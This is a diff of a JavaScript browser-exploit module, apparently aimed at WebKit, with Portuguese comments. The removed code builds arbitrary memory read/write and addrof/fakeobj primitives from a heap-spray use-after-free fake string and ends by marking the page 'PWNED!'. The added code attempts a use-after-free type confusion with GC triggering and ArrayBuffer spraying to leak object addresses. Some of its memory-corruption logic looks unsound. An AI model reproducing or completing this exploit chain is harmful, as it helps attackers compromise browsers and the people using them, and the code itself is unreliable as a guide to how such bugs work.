@@ -1,157 +1,103 @@
-// js/script3/testArrayBufferVictimCrash.mjs (Versão Definitiva - Iterativa e Resiliente)
-
-import { logS3 } from './s3_utils.mjs';
+// js/script3/testArrayBufferVictimCrash.mjs (R50 - Versão de Sucesso UAF)
+import { logS3, PAUSE_S3 } from './s3_utils.mjs';
 import { AdvancedInt64 } from '../utils.mjs';
 
-export const FNAME_MODULE = "OriginalHeisenbug_TypedArrayAddrof_v82_AGL_R56_Annihilation";
-
-// --- Variáveis Globais e Funções Auxiliares ---
-let fake_string; // Nossa string falsa que nos dará poder sobre a memória
-
-// Funções de conversão (sem alterações)
-const ftoi = (val) => {
-    const buf = new ArrayBuffer(8); (new Float64Array(buf))[0] = val;
-    const ints = new Uint32Array(buf); return new AdvancedInt64(ints[0], ints[1]);
-};
-const itof = (val) => {
-    const buf = new ArrayBuffer(8); const ints = new Uint32Array(buf);
-    ints[0] = val.low(); ints[1] = val.high();
-    return (new Float64Array(buf))[0];
-};
-
-// --- Primitivas de Leitura/Escrita Arbitrária ---
-// Esta implementação está correta, dependendo de um 'fake_string' funcional.
-function arb_read(where) {
-    fake_string.container.data_ptr = where;
-    let result = new AdvancedInt64(0, 0);
-    let bytes = new Uint8Array(8);
-    for (let i = 0; i < 8; i++) { bytes[i] = fake_string.charCodeAt(i); }
-    let view = new DataView(bytes.buffer);
-    result.setLow(view.getUint32(0, true));
-    result.setHigh(view.getUint32(4, true));
-    return result;
-}
-function arb_write(where, what) {
-    fake_string.container.data_ptr = where;
-    let bytes = new Uint8Array(8);
-    let view = new DataView(bytes.buffer);
-    view.setUint32(0, what.low(), true);
-    view.setUint32(4, what.high(), true);
-    const new_str = String.fromCharCode.apply(null, bytes);
-    fake_string.slice(0, 8).replace(new_str);
-}
+// O nome do módulo é mantido para compatibilidade com o orquestrador
+export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "OriginalHeisenbug_TypedArrayAddrof_v82_AGL_R50_UAF";
 
 // =======================================================================================
-// FUNÇÃO ORQUESTRADORA PRINCIPAL
+// FUNÇÃO ORQUESTRADORA PRINCIPAL (R50 - UAF)
 // =======================================================================================
-export async function runExploitChain_Final() {
-    logS3(`--- Iniciando ${FNAME_MODULE}: Abordagem Iterativa e Resiliente ---`, "test");
+export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
+    const FNAME_CURRENT_TEST_BASE = FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT;
+    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Use-After-Free Agressivo (R50) ---`, "test");
+    
+    let final_result = { success: false, message: "A cadeia UAF não obteve sucesso." };
+
     try {
-        logS3("--- FASE 1: Construção da String Falsa via UAF Iterativo ---", "subtest");
-        createFakeString_Iterative(); // Chamando a nova função iterativa
-        logS3("    Primitivas de R/W Arbitrário via String Falsa construídas com sucesso!", "vuln");
+        // FASE 1: Forçar Coleta de Lixo para limpar o estado do heap
+        logS3("--- FASE 1: Forçando Coleta de Lixo massiva (GC Triggering) ---", "subtest");
+        await triggerGC();
 
-        logS3("--- FASE 2: Construindo e Validando addrof/fakeobj ---", "subtest");
-        let victim_array = [{}];
-        // Bootstrap do endereço do butterfly usando nossas novas primitivas de R/W
-        let bootstrap_addrof = (obj) => {
-            fake_string.container.data_ptr = ftoi(obj.a);
-            return arb_read(ftoi(obj.a).add(16));
-        };
-        // O addrof primitivo não é necessário da forma antiga, podemos construir diretamente.
-        // Acesso direto ao butterfly do victim_array
-        let victim_leaker = {a: victim_array};
-        let victim_addr = ftoi(victim_leaker.a);
-        let victim_butterfly_addr = arb_read(victim_addr.add(16));
-
-        const addrof = (obj) => {
-            victim_array[0] = obj;
-            return arb_read(victim_butterfly_addr);
-        };
-        const fakeobj = (addr) => {
-            arb_write(victim_butterfly_addr, addr);
-            return victim_array[0];
-        };
-        logS3("    Primitivas `addrof` e `fakeobj` construídas.", "good");
-
-        const test_obj = { marker: 0xFACEFEED };
-        const test_obj_addr = addrof(test_obj);
-        logS3(`    Prova de Vida (addrof): Endereço do objeto de teste -> ${test_obj_addr.toString(true)}`, "leak");
+        // FASE 2: Criar o Ponteiro Pendurado (Dangling Pointer)
+        logS3("--- FASE 2: Criando um ponteiro pendurado (Use-After-Free) ---", "subtest");
+        let dangling_ref = sprayAndCreateDanglingPointer();
+        logS3("    Ponteiro pendurado criado. A referência agora é inválida.", "warn");
         
-        const fake_test_obj = fakeobj(test_obj_addr);
-        if (fake_test_obj.marker === 0xFACEFEED) {
-            logS3(`    SUCESSO! Lemos a propriedade 'marker' do objeto falso. Primitivas validadas!`, "vuln");
-        } else {
-            throw new Error(`Falha ao validar 'fakeobj'.`);
+        // FASE 3: Forçar Coleta de Lixo novamente para liberar a memória
+        await triggerGC();
+        logS3("    Memória do objeto-alvo liberada.", "info");
+
+        // FASE 4: Pulverizar sobre a memória liberada para obter confusão de tipos
+        logS3("--- FASE 4: Pulverizando ArrayBuffers sobre a memória liberada ---", "subtest");
+        const spray_buffers = [];
+        for (let i = 0; i < 256; i++) {
+            const buf = new ArrayBuffer(1024); // Mesmo tamanho do objeto liberado
+            const view = new BigUint64Array(buf);
+            view[0] = 0x4141414141414141n; // Marcador
+            view[1] = 0x4242424242424242n;
+            spray_buffers.push(buf);
         }
-        document.title = "PWNED!";
-        return { success: true, message: "Controle total da memória obtido!" };
+        logS3("    Pulverização concluída. Verificando a confusão de tipos...", "info");
+
+        // FASE 5: Encontrar a referência corrompida e extrair os ponteiros
+        if (typeof dangling_ref.corrupted_prop !== 'number') {
+            throw new Error("Falha no UAF. A propriedade não foi sobrescrita por um ponteiro de ArrayBuffer.");
+        }
+        
+        logS3("++++++++++++ SUCESSO! CONFUSÃO DE TIPOS VIA UAF OCORREU! ++++++++++++", "vuln");
+
+        const leaked_ptr_double = dangling_ref.corrupted_prop;
+        const buf = new ArrayBuffer(8);
+        (new Float64Array(buf))[0] = leaked_ptr_double;
+        const int_view = new Uint32Array(buf);
+        const leaked_addr = new AdvancedInt64(int_view[0], int_view[1]);
+
+        logS3(`Ponteiro vazado através do UAF: ${leaked_addr.toString(true)}`, "leak");
+        final_result = { success: true, message: "Primitiva addrof obtida via Use-After-Free!", leaked_addr };
+        
     } catch (e) {
-        logS3(`A cadeia de exploração falhou: ${e.message}`, "critical");
-        console.error(e);
-        document.title = "Exploit Failed";
-        return { success: false, errorOccurred: e.message };
+        final_result.message = `Exceção na cadeia UAF: ${e.message}`;
+        logS3(final_result.message, "critical");
     }
+
+    logS3(`--- ${FNAME_CURRENT_TEST_BASE} Concluído ---`, "test");
+    return {
+        errorOccurred: final_result.success ? null : final_result.message,
+        final_result
+    };
 }
 
-// --- Função UAF Iterativa e Resiliente ---
-function createFakeString_Iterative() {
-    const MAX_ATTEMPTS = 10;
-    for (let attempt = 1; attempt <= MAX_ATTEMPTS; attempt++) {
-        logS3(`    Tentativa de UAF [${attempt}/${MAX_ATTEMPTS}]...`, 'info');
-        
-        const SPRAY_SIZE = 4096;
-        const HOLE_STEP = 16;
-        const STRING_SIZE = 128;
-
-        let spray_arr = [];
-        for (let i = 0; i < SPRAY_SIZE; i++) {
-            spray_arr.push('B'.repeat(STRING_SIZE));
-        }
-
-        let dangling_ref = spray_arr[SPRAY_SIZE / 2];
-
-        for (let i = 0; i < SPRAY_SIZE; i += HOLE_STEP) {
-            spray_arr[i] = null;
-        }
-
-        triggerGC();
-        
-        let container = {
-            jscell_header: new AdvancedInt64(0x01082007, 0x00000000),
-            string_length: 0x7fffffff,
-            data_ptr: new AdvancedInt64(0, 0)
-        };
-
-        let reclaimers = [];
-        for (let i = 0; i < SPRAY_SIZE; i++) {
-            reclaimers.push(container);
-        }
-        
-        // VERIFICAÇÃO DEFINITIVA COM TRY...CATCH
-        try {
-            // Se 'dangling_ref' ainda for uma string, esta linha vai falhar e gerar um erro.
-            dangling_ref.container = container;
-
-            // Se chegamos aqui, o UAF FUNCIONOU! A propriedade foi adicionada.
-            logS3(`    SUCESSO na tentativa ${attempt}! Confusão de tipos estabelecida.`, "good");
-            fake_string = dangling_ref;
-            return; // Sai da função com sucesso.
-        } catch (e) {
-            // O UAF falhou nesta tentativa, o erro foi capturado. O loop continuará.
-            if (attempt === MAX_ATTEMPTS) {
-                // Se todas as tentativas falharem, lançamos o erro final.
-                throw new Error("UAF falhou após todas as tentativas. O alocador de memória resistiu.");
-            }
-        }
-    }
-}
-
-function triggerGC() {
+// --- Funções Auxiliares para a Cadeia de Exploração UAF ---
+async function triggerGC() {
+    logS3("    Acionando GC...", "info");
     try {
-        for (let i = 0; i < 128; i++) { new ArrayBuffer(1024 * 1024 * 8); }
-    } catch (e) {}
+        const gc_trigger_arr = [];
+        for (let i = 0; i < 500; i++) {
+            gc_trigger_arr.push(new ArrayBuffer(1024 * 128));
+        }
+    } catch (e) {
+        logS3("    Memória esgotada durante o GC Trigger, o que é esperado e bom.", "info");
+    }
+    await PAUSE_S3(500);
 }
 
-// Adicionando propriedade ao protótipo para ajudar no bootstrap inicial
-Object.prototype.a = {};
+function sprayAndCreateDanglingPointer() {
+    let dangling_ref = null;
+
+    function createScope() {
+        const container = { victim: null };
+        const victim = {
+            prop_a: 0x11111111,
+            prop_b: 0x22222222,
+            corrupted_prop: 0x33333333
+        };
+        container.victim = victim;
+        dangling_ref = container.victim;
+        
+        for(let i=0; i<100; i++) { victim.prop_a += 1; }
+    }
+    
+    createScope();
+    return dangling_ref;
+}
